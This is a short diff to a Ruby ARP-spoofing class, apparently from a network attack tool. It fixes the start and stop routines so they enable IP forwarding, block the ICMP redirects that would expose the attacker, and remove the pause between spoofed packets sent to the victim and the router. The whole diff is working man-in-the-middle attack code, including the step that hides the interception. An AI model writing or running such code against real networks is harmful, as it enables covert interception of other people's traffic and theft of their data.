@@ -107,10 +107,10 @@ class ARPSpoof < Spoof
         `echo 1 > /proc/sys/net/ipv4/ip_forward`
         
         # Prevent ICMP Redirect from coming out of attacker's machine
-        iptables -A OUTPUT -p ICMP --icmp-type 5 -j DROP
+        `iptables -A OUTPUT -p ICMP --icmp-type 5 -j DROP`
         
         while(@running)
-            sleep 2
+            #sleep 2
             send(@victim_packet, @iface)
             send(@router_packet, @iface)
         end # while
@@ -132,6 +132,6 @@ class ARPSpoof < Spoof
         `echo 0 > /proc/sys/net/ipv4/ip_forward`
         
         # Delete rule
-        iptables -D INPUT -p ICMP --icmp-type 5 -j DROP 
+        `iptables -D OUTPUT -p ICMP --icmp-type 5 -j DROP` 
     end # stop
 end
